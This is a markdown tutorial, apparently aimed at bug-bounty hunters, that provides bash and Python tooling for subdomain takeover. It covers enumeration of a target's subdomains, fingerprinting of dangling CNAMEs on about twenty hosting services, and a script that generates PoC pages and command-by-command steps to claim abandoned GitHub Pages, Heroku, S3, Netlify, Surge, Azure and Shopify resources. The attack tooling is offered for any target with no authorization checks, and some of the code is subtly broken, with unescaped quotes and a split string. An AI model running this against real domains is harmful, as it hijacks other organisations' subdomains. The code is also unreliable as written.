# 🔥 Elite Subdomain Takeover Automation Framework
## Advanced Techniques for $100-500+ Bug Bounty Rewards

### 🎯 Overview
Subdomain takeover vulnerabilities occur when a subdomain points to a service that is no longer in use, allowing attackers to claim the service and serve malicious content. This comprehensive framework covers everything from basic discovery to advanced exploitation techniques.

## 🛠️ Phase 1: Subdomain Discovery & DNS Analysis

### Automated Subdomain Discovery
```bash
#!/bin/bash
# subdomain_discovery.sh - Comprehensive subdomain discovery

TARGET=$1
echo "🔍 Discovering subdomains for $TARGET"

# Method 1: Multiple subdomain enumeration tools
echo "🎯 Running multiple subdomain enumeration tools..."

# Subfinder
subfinder -d $TARGET -silent -o subfinder_results.txt
echo "✅ Subfinder found $(wc -l < subfinder_results.txt) subdomains"

# Amass
amass enum -passive -d $TARGET -o amass_results.txt
echo "✅ Amass found $(wc -l < amass_results.txt) subdomains"

# Assetfinder
assetfinder --subs-only $TARGET > assetfinder_results.txt
echo "✅ Assetfinder found $(wc -l < assetfinder_results.txt) subdomains"

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt_results.txt
echo "✅ Certificate Transparency found $(wc -l < crt_results.txt) subdomains"

# DNS Brute Force
cat > subdomain_wordlist.txt << 'EOF'
www
mail
ftp
admin
test
dev
staging
api
app
blog
shop
store
portal
dashboard
panel
cpanel
webmail
secure
vpn
remote
support
help
docs
wiki
forum
community
news
media
static
assets
cdn
img
images
js
css
files
download
upload
backup
old
new
beta
alpha
demo
sandbox
lab
research
internal
private
public
mobile
m
wap
imap
pop
smtp
ns1
ns2
ns3
dns1
dns2
mx1
mx2
exchange
owa
autodiscover
lyncdiscover
sip
voip
pbx
git
svn
jenkins
ci
cd
build
deploy
monitor
log
logs
stats
analytics
metrics
grafana
kibana
elastic
redis
mongo
mysql
postgres
db
database
cache
queue
worker
cron
scheduler
backup
archive
vault
secret
key
cert
ssl
tls
proxy
gateway
load
balance
cluster
node
server
host
vm
container
docker
k8s
kubernetes
aws
azure
gcp
cloud
s3
blob
storage
bucket
lambda
function
serverless
edge
cloudfront
cloudflare
akamai
fastly
maxcdn
keycdn
EOF

# Run DNS brute force
massdns -r /usr/share/massdns/lists/resolvers.txt -t A -o S -w massdns_results.txt <(sed "s/$/.$TARGET/" subdomain_wordlist.txt)
cat massdns_results.txt | awk '{print $1}' | sed 's/\.$//g' > bruteforce_results.txt
echo "✅ DNS brute force found $(wc -l < bruteforce_results.txt) subdomains"

# Combine all results
cat subfinder_results.txt amass_results.txt assetfinder_results.txt crt_results.txt bruteforce_results.txt | sort -u > all_subdomains.txt
echo "✅ Total unique subdomains found: $(wc -l < all_subdomains.txt)"

# Method 2: GitHub and Google dorking for subdomains
echo "🔍 Searching GitHub and Google for subdomains..."

# GitHub search (requires GitHub token)
if [ ! -z "$GITHUB_TOKEN" ]; then
    curl -s -H "Authorization: token $GITHUB_TOKEN" \
         "https://api.github.com/search/code?q=$TARGET+extension:txt+extension:json+extension:yml+extension:yaml+extension:xml" | \
         jq -r '.items[].html_url' | \
         xargs -I {} curl -s {} | \
         grep -Eo "[a-zA-Z0-9.-]+\.$TARGET" | \
         sort -u >> github_subdomains.txt
    echo "✅ GitHub search found $(wc -l < github_subdomains.txt) subdomains"
fi

# Google dorking (basic)
curl -s "https://www.google.com/search?q=site:$TARGET" | \
grep -Eo "https?://[a-zA-Z0-9.-]+\.$TARGET" | \
sed 's/https\?:\/\///g' | \
sort -u > google_subdomains.txt
echo "✅ Google search found $(wc -l < google_subdomains.txt) subdomains"

# Update final list
cat all_subdomains.txt github_subdomains.txt google_subdomains.txt | sort -u > final_subdomains.txt
echo "✅ Final subdomain count: $(wc -l < final_subdomains.txt)"
```

### Advanced DNS Analysis
```python
#!/usr/bin/env python3
# dns_analyzer.py - Advanced DNS analysis for subdomain takeover

import dns.resolver
import dns.exception
import requests
import json
import concurrent.futures
import threading
from collections import defaultdict
import time

class DNSAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Known vulnerable services and their signatures
        self.vulnerable_services = {
            'github': {
                'cname_patterns': ['github.io', 'github.com'],
                'error_signatures': ['There isn't a GitHub Pages site here', 'For root URLs'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://pages.github.com/'
            },
            'heroku': {
                'cname_patterns': ['herokuapp.com', 'herokussl.com'],
                'error_signatures': ['No such app', 'There's nothing here'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.heroku.com/'
            },
            'netlify': {
                'cname_patterns': ['netlify.com', 'netlify.app'],
                'error_signatures': ['Not Found', 'Page not found'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.netlify.com/'
            },
            'surge': {
                'cname_patterns': ['surge.sh'],
                'error_signatures': ['project not found'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://surge.sh/'
            },
            'bitbucket': {
                'cname_patterns': ['bitbucket.io'],
                'error_signatures': ['Repository not found'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://bitbucket.org/'
            },
            'tumblr': {
                'cname_patterns': ['domains.tumblr.com'],
                'error_signatures': ['Whatever you were looking for doesn't currently exist'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.tumblr.com/'
            },
            'shopify': {
                'cname_patterns': ['shops.myshopify.com', 'myshopify.com'],
                'error_signatures': ['Sorry, this shop is currently unavailable'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.shopify.com/'
            },
            'zendesk': {
                'cname_patterns': ['zendesk.com'],
                'error_signatures': ['Help Center Closed'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.zendesk.com/'
            },
            'uservoice': {
                'cname_patterns': ['uservoice.com'],
                'error_signatures': ['This UserVoice subdomain is currently available'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.uservoice.com/'
            },
            'ghost': {
                'cname_patterns': ['ghost.io'],
                'error_signatures': ['The thing you were looking for is no longer here'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://ghost.org/'
            },
            'pantheon': {
                'cname_patterns': ['pantheonsite.io'],
                'error_signatures': ['The gods are wise'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://pantheon.io/'
            },
            'gitbook': {
                'cname_patterns': ['gitbook.io'],
                'error_signatures': ['We could not find what you're looking for'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.gitbook.com/'
            },
            'fastly': {
                'cname_patterns': ['fastly.com', 'fastlylb.net'],
                'error_signatures': ['Fastly error: unknown domain'],
                'http_codes': [404],
                'takeover_possible': False,
                'service_url': 'https://www.fastly.com/'
            },
            'cloudfront': {
                'cname_patterns': ['cloudfront.net'],
                'error_signatures': ['Bad Request', 'The request could not be satisfied'],
                'http_codes': [403, 404],
                'takeover_possible': False,
                'service_url': 'https://aws.amazon.com/cloudfront/'
            },
            'azure': {
                'cname_patterns': ['azurewebsites.net', 'cloudapp.net', 'azureedge.net'],
                'error_signatures': ['Web App - Unavailable'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://azure.microsoft.com/'
            },
            'aws_s3': {
                'cname_patterns': ['s3.amazonaws.com', 's3-website'],
                'error_signatures': ['NoSuchBucket', 'The specified bucket does not exist'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://aws.amazon.com/s3/'
            },
            'unbounce': {
                'cname_patterns': ['unbouncepages.com'],
                'error_signatures': ['The requested URL was not found on this server'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://unbounce.com/'
            },
            'helpjuice': {
                'cname_patterns': ['helpjuice.com'],
                'error_signatures': ['We could not find what you're looking for'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://helpjuice.com/'
            },
            'helpscout': {
                'cname_patterns': ['helpscoutdocs.com'],
                'error_signatures': ['No settings were found for this company'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.helpscout.com/'
            },
            'cargo': {
                'cname_patterns': ['cargocollective.com'],
                'error_signatures': ['404 Not Found'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://cargocollective.com/'
            },
            'statuspage': {
                'cname_patterns': ['statuspage.io'],
                'error_signatures': ['You are being redirected'],
                'http_codes': [404],
                'takeover_possible': True,
                'service_url': 'https://www.statuspage.io/'
            },
            'amazonaws': {
                'cname_patterns': ['amazonaws.com'],
                'error_signatures': ['NoSuchBucket', 'PermanentRedirect'],
                'http_codes': [404, 403],
                'takeover_possible': True,
                'service_url': 'https://aws.amazon.com/'
            }
        }
    
    def analyze_subdomain(self, subdomain):
        """Comprehensive subdomain analysis"""
        result = {
            'subdomain': subdomain,
            'dns_records': {},
            'http_status': None,
            'http_response': '',
            'vulnerable_service': None,
            'takeover_possible': False,
            'confidence': 0,
            'evidence': []
        }
        
        # DNS Analysis
        dns_info = self.get_dns_records(subdomain)
        result['dns_records'] = dns_info
        
        # HTTP Analysis
        http_info = self.get_http_response(subdomain)
        result['http_status'] = http_info['status']
        result['http_response'] = http_info['content']
        
        # Vulnerability Analysis
        vuln_info = self.check_vulnerability(dns_info, http_info)
        result.update(vuln_info)
        
        return result
    
    def get_dns_records(self, subdomain):
        """Get comprehensive DNS records"""
        dns_info = {
            'A': [],
            'AAAA': [],
            'CNAME': [],
            'MX': [],
            'NS': [],
            'TXT': [],
            'SOA': []
        }
        
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(subdomain, record_type)
                for answer in answers:
                    dns_info[record_type].append(str(answer))
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
                continue
            except Exception as e:
                continue
        
        return dns_info
    
    def get_http_response(self, subdomain):
        """Get HTTP response from subdomain"""
        protocols = ['https', 'http']
        
        for protocol in protocols:
            try:
                url = f"{protocol}://{subdomain}"
                response = self.session.get(url, timeout=10, allow_redirects=True)
                
                return {
                    'status': response.status_code,
                    'content': response.text[:2000],  # First 2000 chars
                    'headers': dict(response.headers),
                    'url': url,
                    'final_url': response.url
                }
            except Exception as e:
                continue
        
        return {
            'status': None,
            'content': '',
            'headers': {},
            'url': '',
            'final_url': '',
            'error': 'No HTTP response'
        }
    
    def check_vulnerability(self, dns_info, http_info):
        """Check for subdomain takeover vulnerability"""
        result = {
            'vulnerable_service': None,
            'takeover_possible': False,
            'confidence': 0,
            'evidence': []
        }
        
        # Check CNAME records against known vulnerable services
        cnames = dns_info.get('CNAME', [])
        
        for cname in cnames:
            for service_name, service_info in self.vulnerable_services.items():
                # Check if CNAME matches known patterns
                if any(pattern in cname.lower() for pattern in service_info['cname_patterns']):
                    result['vulnerable_service'] = service_name
                    result['evidence'].append(f"CNAME points to {service_name}: {cname}")
                    
                    # Check HTTP response for error signatures
                    if http_info['content']:
                        for signature in service_info['error_signatures']:
                            if signature.lower() in http_info['content'].lower():
                                result['takeover_possible'] = service_info['takeover_possible']
                                result['confidence'] += 30
                                result['evidence'].append(f"Error signature found: {signature}")
                    
                    # Check HTTP status codes
                    if http_info['status'] in service_info['http_codes']:
                        result['confidence'] += 20
                        result['evidence'].append(f"Vulnerable HTTP status: {http_info['status']}")
                    
                    # Additional checks for specific services
                    if service_name == 'github' and 'github.io' in cname:
                        if '404' in str(http_info['status']) or 'not found' in http_info['content'].lower():
                            result['confidence'] += 40
                    
                    elif service_name == 'aws_s3':
                        if 'NoSuchBucket' in http_info['content'] or 'does not exist' in http_info['content']:
                            result['confidence'] += 50
                    
                    elif service_name == 'heroku':
                        if 'no such app' in http_info['content'].lower():
                            result['confidence'] += 45
        
        # Check for dangling DNS records (CNAME exists but target doesn't resolve)
        if cnames and not dns_info.get('A') and not dns_info.get('AAAA'):
            result['evidence'].append("Dangling CNAME record detected")
            result['confidence'] += 25
        
        return result
    
    def batch_analyze(self, subdomains, max_workers=50):
        """Analyze multiple subdomains concurrently"""
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_subdomain = {
                executor.submit(self.analyze_subdomain, subdomain): subdomain 
                for subdomain in subdomains
            }
            
            for future in concurrent.futures.as_completed(future_to_subdomain):
                subdomain = future_to_subdomain[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Print interesting findings
                    if result['takeover_possible'] and result['confidence'] > 50:
                        print(f"🔥 HIGH CONFIDENCE TAKEOVER: {subdomain} -> {result['vulnerable_service']} (Confidence: {result['confidence']}%)")
                    elif result['vulnerable_service']:
                        print(f"⚠️  POTENTIAL TAKEOVER: {subdomain} -> {result['vulnerable_service']} (Confidence: {result['confidence']}%)")
                    
                except Exception as e:
                    print(f"❌ Error analyzing {subdomain}: {str(e)}")
        
        return results

# Usage
def main():
    with open('final_subdomains.txt', 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    analyzer = DNSAnalyzer()
    
    print(f"🎯 Analyzing {len(subdomains)} subdomains for takeover vulnerabilities...")
    results = analyzer.batch_analyze(subdomains)
    
    # Filter and sort results by confidence
    vulnerable_results = [r for r in results if r['takeover_possible'] and r['confidence'] > 30]
    vulnerable_results.sort(key=lambda x: x['confidence'], reverse=True)
    
    # Save results
    with open('subdomain_takeover_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    with open('vulnerable_subdomains.json', 'w') as f:
        json.dump(vulnerable_results, f, indent=2)
    
    print(f"✅ Analysis completed!")
    print(f"📊 Total subdomains analyzed: {len(results)}")
    print(f"🔥 Potentially vulnerable subdomains: {len(vulnerable_results)}")
    
    # Print top findings
    print("
🎯 Top Vulnerable Subdomains:")
    for result in vulnerable_results[:10]:
        print(f"  • {result['subdomain']} -> {result['vulnerable_service']} ({result['confidence']}% confidence)")
        for evidence in result['evidence']:
            print(f"    - {evidence}")

if __name__ == "__main__":
    main()
```

## 💰 Phase 2: Automated Takeover Exploitation

### 1. Service-Specific Takeover Scripts
```python
#!/usr/bin/env python3
# takeover_exploiter.py - Automated subdomain takeover exploitation

import requests
import json
import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

class SubdomainTakeoverExploiter:
    def __init__(self):
        self.session = requests.Session()
        
        # Setup headless Chrome for automation
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        self.driver = webdriver.Chrome(options=chrome_options)
        
        # Service-specific exploitation methods
        self.exploitation_methods = {
            'github': self.exploit_github_pages,
            'heroku': self.exploit_heroku,
            'netlify': self.exploit_netlify,
            'surge': self.exploit_surge,
            'aws_s3': self.exploit_aws_s3,
            'azure': self.exploit_azure,
            'shopify': self.exploit_shopify
        }
    
    def exploit_github_pages(self, subdomain, cname_target):
        """Exploit GitHub Pages subdomain takeover"""
        try:
            print(f"🎯 Attempting GitHub Pages takeover for {subdomain}")
            
            # Extract repository name from CNAME
            if 'github.io' in cname_target:
                repo_name = cname_target.split('.')[0]
            else:
                repo_name = subdomain.split('.')[0]
            
            # Create proof-of-concept HTML
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Subdomain Takeover PoC - {subdomain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }}
                    .container {{ max-width: 600px; margin: 0 auto; }}
                    .alert {{ background: #ff4444; color: white; padding: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="alert">
                        <h1>🔥 Subdomain Takeover Successful!</h1>
                        <p><strong>Subdomain:</strong> {subdomain}</p>
                        <p><strong>Service:</strong> GitHub Pages</p>
                        <p><strong>CNAME Target:</strong> {cname_target}</p>
                        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                        <p>This subdomain was vulnerable to takeover via GitHub Pages.</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Save PoC HTML
            with open(f'github_poc_{subdomain.replace(".", "_")}.html', 'w') as f:
                f.write(poc_html)
            
            # Instructions for manual takeover
            instructions = f"""
            GitHub Pages Takeover Instructions for {subdomain}:
            
            1. Create a new GitHub repository named: {repo_name}
            2. Enable GitHub Pages in repository settings
            3. Upload the PoC HTML file as index.html
            4. Add CNAME file with content: {subdomain}
            5. Wait for DNS propagation (5-10 minutes)
            6. Verify takeover by visiting https://{subdomain}
            
            Repository URL: https://github.com/YOUR_USERNAME/{repo_name}
            """
            
            with open(f'github_instructions_{subdomain.replace(".", "_")}.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'instructions_file': f'github_instructions_{subdomain.replace(".", "_")}.txt',
                'poc_file': f'github_poc_{subdomain.replace(".", "_")}.html'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_heroku(self, subdomain, cname_target):
        """Exploit Heroku subdomain takeover"""
        try:
            print(f"🎯 Attempting Heroku takeover for {subdomain}")
            
            # Extract app name from CNAME
            app_name = cname_target.split('.')[0]
            
            # Create Heroku app (requires Heroku CLI and authentication)
            instructions = f"""
            Heroku Takeover Instructions for {subdomain}:
            
            1. Install Heroku CLI: https://devcenter.heroku.com/articles/heroku-cli
            2. Login: heroku login
            3. Create app: heroku create {app_name}
            4. Deploy PoC application
            5. Add custom domain: heroku domains:add {subdomain} --app {app_name}
            6. Verify takeover
            
            If app name is taken, try variations like {app_name}-poc, {app_name}-test
            """
            
            # Create simple Node.js PoC app
            package_json = {
                "name": f"{app_name}-poc",
                "version": "1.0.0",
                "description": "Subdomain takeover PoC",
                "main": "index.js",
                "scripts": {"start": "node index.js"},
                "dependencies": {"express": "^4.17.1"}
            }
            
            index_js = f"""
            const express = require('express');
            const app = express();
            const port = process.env.PORT || 3000;
            
            app.get('/', (req, res) => {{
                res.send(`
                    <html>
                    <head><title>Subdomain Takeover PoC - {subdomain}</title></head>
                    <body style="font-family: Arial; text-align: center; margin-top: 100px;">
                        <div style="background: #ff4444; color: white; padding: 20px; border-radius: 5px; max-width: 600px; margin: 0 auto;">
                            <h1>🔥 Subdomain Takeover Successful!</h1>
                            <p><strong>Subdomain:</strong> {subdomain}</p>
                            <p><strong>Service:</strong> Heroku</p>
                            <p><strong>App Name:</strong> {app_name}</p>
                            <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                        </div>
                    </body>
                    </html>
                `);
            }});
            
            app.listen(port, () => {{
                console.log(`PoC app listening at http://localhost:${{port}}`);
            }});
            """
            
            # Save files
            os.makedirs(f'heroku_poc_{subdomain.replace(".", "_")}', exist_ok=True)
            
            with open(f'heroku_poc_{subdomain.replace(".", "_")}/package.json', 'w') as f:
                json.dump(package_json, f, indent=2)
            
            with open(f'heroku_poc_{subdomain.replace(".", "_")}/index.js', 'w') as f:
                f.write(index_js)
            
            with open(f'heroku_poc_{subdomain.replace(".", "_")}/instructions.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'poc_directory': f'heroku_poc_{subdomain.replace(".", "_")}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_aws_s3(self, subdomain, cname_target):
        """Exploit AWS S3 subdomain takeover"""
        try:
            print(f"🎯 Attempting AWS S3 takeover for {subdomain}")
            
            # Extract bucket name from CNAME
            if 's3-website' in cname_target:
                bucket_name = cname_target.split('.s3-website')[0]
            else:
                bucket_name = subdomain.replace('.', '-')
            
            # Create PoC HTML
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>S3 Subdomain Takeover PoC - {subdomain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }}
                    .container {{ max-width: 600px; margin: 0 auto; }}
                    .alert {{ background: #ff4444; color: white; padding: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="alert">
                        <h1>🔥 S3 Subdomain Takeover Successful!</h1>
                        <p><strong>Subdomain:</strong> {subdomain}</p>
                        <p><strong>Service:</strong> AWS S3</p>
                        <p><strong>Bucket Name:</strong> {bucket_name}</p>
                        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            instructions = f"""
            AWS S3 Takeover Instructions for {subdomain}:
            
            1. Install AWS CLI: https://aws.amazon.com/cli/
            2. Configure AWS credentials: aws configure
            3. Create S3 bucket: aws s3 mb s3://{bucket_name}
            4. Enable static website hosting:
               aws s3 website s3://{bucket_name} --index-document index.html
            5. Upload PoC HTML:
               aws s3 cp index.html s3://{bucket_name}/index.html --acl public-read
            6. Verify takeover by visiting https://{subdomain}
            
            Note: Bucket name must be globally unique. Try variations if needed.
            """
            
            # Save files
            with open(f's3_poc_{subdomain.replace(".", "_")}.html', 'w') as f:
                f.write(poc_html)
            
            with open(f's3_instructions_{subdomain.replace(".", "_")}.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'instructions_file': f's3_instructions_{subdomain.replace(".", "_")}.txt',
                'poc_file': f's3_poc_{subdomain.replace(".", "_")}.html'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_netlify(self, subdomain, cname_target):
        """Exploit Netlify subdomain takeover"""
        try:
            print(f"🎯 Attempting Netlify takeover for {subdomain}")
            
            # Create PoC HTML
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Netlify Subdomain Takeover PoC - {subdomain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }}
                    .container {{ max-width: 600px; margin: 0 auto; }}
                    .alert {{ background: #ff4444; color: white; padding: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="alert">
                        <h1>🔥 Netlify Subdomain Takeover Successful!</h1>
                        <p><strong>Subdomain:</strong> {subdomain}</p>
                        <p><strong>Service:</strong> Netlify</p>
                        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Create _redirects file for Netlify
            redirects_content = f"""
            # Netlify redirects file
            /*    /index.html   200
            """
            
            instructions = f"""
            Netlify Takeover Instructions for {subdomain}:
            
            1. Create account at https://netlify.com
            2. Create new site from Git or drag & drop
            3. Upload the PoC HTML files
            4. Go to Domain settings
            5. Add custom domain: {subdomain}
            6. Netlify will provide DNS instructions
            7. Verify takeover
            
            Files to upload:
            - index.html (PoC page)
            - _redirects (Netlify config)
            """
            
            # Save files
            os.makedirs(f'netlify_poc_{subdomain.replace(".", "_")}', exist_ok=True)
            
            with open(f'netlify_poc_{subdomain.replace(".", "_")}/index.html', 'w') as f:
                f.write(poc_html)
            
            with open(f'netlify_poc_{subdomain.replace(".", "_")}/_redirects', 'w') as f:
                f.write(redirects_content)
            
            with open(f'netlify_poc_{subdomain.replace(".", "_")}/instructions.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'poc_directory': f'netlify_poc_{subdomain.replace(".", "_")}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_surge(self, subdomain, cname_target):
        """Exploit Surge.sh subdomain takeover"""
        try:
            print(f"🎯 Attempting Surge.sh takeover for {subdomain}")
            
            # Create PoC HTML
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Surge.sh Subdomain Takeover PoC - {subdomain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }}
                    .container {{ max-width: 600px; margin: 0 auto; }}
                    .alert {{ background: #ff4444; color: white; padding: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="alert">
                        <h1>🔥 Surge.sh Subdomain Takeover Successful!</h1>
                        <p><strong>Subdomain:</strong> {subdomain}</p>
                        <p><strong>Service:</strong> Surge.sh</p>
                        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Create CNAME file for Surge
            cname_content = subdomain
            
            instructions = f"""
            Surge.sh Takeover Instructions for {subdomain}:
            
            1. Install Surge CLI: npm install -g surge
            2. Create account: surge login
            3. Navigate to PoC directory
            4. Deploy: surge --domain {subdomain}
            5. Verify takeover
            
            Commands:
            cd surge_poc_{subdomain.replace(".", "_")}
            surge --domain {subdomain}
            """
            
            # Save files
            os.makedirs(f'surge_poc_{subdomain.replace(".", "_")}', exist_ok=True)
            
            with open(f'surge_poc_{subdomain.replace(".", "_")}/index.html', 'w') as f:
                f.write(poc_html)
            
            with open(f'surge_poc_{subdomain.replace(".", "_")}/CNAME', 'w') as f:
                f.write(cname_content)
            
            with open(f'surge_poc_{subdomain.replace(".", "_")}/instructions.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'poc_directory': f'surge_poc_{subdomain.replace(".", "_")}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_azure(self, subdomain, cname_target):
        """Exploit Azure subdomain takeover"""
        try:
            print(f"🎯 Attempting Azure takeover for {subdomain}")
            
            # Extract app name from CNAME
            app_name = cname_target.split('.')[0]
            
            instructions = f"""
            Azure Takeover Instructions for {subdomain}:
            
            1. Install Azure CLI: https://docs.microsoft.com/en-us/cli/azure/install-azure-cli
            2. Login: az login
            3. Create resource group: az group create --name rg-{app_name} --location eastus
            4. Create app service plan: az appservice plan create --name plan-{app_name} --resource-group rg-{app_name} --sku FREE
            5. Create web app: az webapp create --name {app_name} --resource-group rg-{app_name} --plan plan-{app_name}
            6. Add custom domain: az webapp config hostname add --webapp-name {app_name} --resource-group rg-{app_name} --hostname {subdomain}
            7. Deploy PoC content
            8. Verify takeover
            
            Note: App name must be globally unique. Try variations if needed.
            """
            
            # Create PoC files
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Azure Subdomain Takeover PoC - {subdomain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }}
                    .container {{ max-width: 600px; margin: 0 auto; }}
                    .alert {{ background: #ff4444; color: white; padding: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="alert">
                        <h1>🔥 Azure Subdomain Takeover Successful!</h1>
                        <p><strong>Subdomain:</strong> {subdomain}</p>
                        <p><strong>Service:</strong> Azure App Service</p>
                        <p><strong>App Name:</strong> {app_name}</p>
                        <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Save files
            os.makedirs(f'azure_poc_{subdomain.replace(".", "_")}', exist_ok=True)
            
            with open(f'azure_poc_{subdomain.replace(".", "_")}/index.html', 'w') as f:
                f.write(poc_html)
            
            with open(f'azure_poc_{subdomain.replace(".", "_")}/instructions.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'poc_directory': f'azure_poc_{subdomain.replace(".", "_")}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_shopify(self, subdomain, cname_target):
        """Exploit Shopify subdomain takeover"""
        try:
            print(f"🎯 Attempting Shopify takeover for {subdomain}")
            
            instructions = f"""
            Shopify Takeover Instructions for {subdomain}:
            
            1. Create Shopify account: https://www.shopify.com/
            2. Start free trial
            3. Go to Online Store > Domains
            4. Add custom domain: {subdomain}
            5. Follow Shopify's DNS setup instructions
            6. Customize store to show PoC content
            7. Verify takeover
            
            Note: This requires a Shopify subscription after trial period.
            """
            
            with open(f'shopify_instructions_{subdomain.replace(".", "_")}.txt', 'w') as f:
                f.write(instructions)
            
            return {
                'success': True,
                'method': 'manual',
                'instructions_file': f'shopify_instructions_{subdomain.replace(".", "_")}.txt'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exploit_subdomain(self, vulnerability_data):
        """Exploit a vulnerable subdomain"""
        subdomain = vulnerability_data['subdomain']
        service = vulnerability_data['vulnerable_service']
        cname_target = vulnerability_data['dns_records'].get('CNAME', [''])[0]
        
        if service in self.exploitation_methods:
            print(f"🎯 Exploiting {subdomain} via {service}")
            result = self.exploitation_methods[service](subdomain, cname_target)
            
            if result['success']:
                print(f"✅ Exploitation setup completed for {subdomain}")
                return result
            else:
                print(f"❌ Exploitation failed for {subdomain}: {result.get('error', 'Unknown error')}")
                return result
        else:
            print(f"⚠️  No exploitation method available for {service}")
            return {'success': False, 'error': f'No method for {service}'}
    
    def __del__(self):
        """Cleanup"""
        if hasattr(self, 'driver'):
            self.driver.quit()

# Usage
def main():
    with open('vulnerable_subdomains.json', 'r') as f:
        vulnerable_subdomains = json.load(f)
    
    exploiter = SubdomainTakeoverExploiter()
    
    print(f"🎯 Setting up exploitation for {len(vulnerable_subdomains)} vulnerable subdomains...")
    
    exploitation_results = []
    
    for vuln_data in vulnerable_subdomains:
        if vuln_data['confidence'] > 70:  # Only exploit high-confidence findings
            result = exploiter.exploit_subdomain(vuln_data)
            exploitation_results.append({
                'subdomain': vuln_data['subdomain'],
                'service': vuln_data['vulnerable_service'],
                'exploitation_result': result
            })
    
    # Save exploitation results
    with open('exploitation_results.json', 'w') as f:
        json.dump(exploitation_results, f, indent=2)
    
    print(f"✅ Exploitation setup completed!")
    print(f"📁 Check individual PoC directories and instruction files")
    print(f"📊 Results saved to exploitation_results.json")

